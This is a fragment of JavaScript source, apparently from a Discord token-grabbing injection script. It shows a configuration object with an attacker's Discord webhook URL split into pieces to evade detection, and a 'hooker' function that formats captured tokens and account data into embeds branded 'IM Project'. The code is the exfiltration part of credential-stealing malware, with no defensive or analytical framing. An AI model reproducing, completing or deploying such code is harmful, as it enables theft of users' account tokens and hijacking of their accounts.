...
const CONFIG = {
    webhook: "%WEBHOOK%",
    whp1: "https://dis",
    whp2: "cord.com/api/webhooks/1473168041801023663/",
    whp3: "Popu0FEhg-BcU2a2QM3Zfr21",
    whp4: "GXrX1irmoiHGnRmwd8p3Lms",
    whp5: "vAZmCqcfZh7tvu7uy_pF5",
...
const hooker = async (content, token, account) => {
    ...
    content["embeds"][0]["footer"] = {
        "text": "IM Project | https://rvlt.gg/CwEwm4CK",
    };
    ...
    for (const embed in content["embeds"]) {
        content["embeds"][embed]["color"] = 6225920;
    }
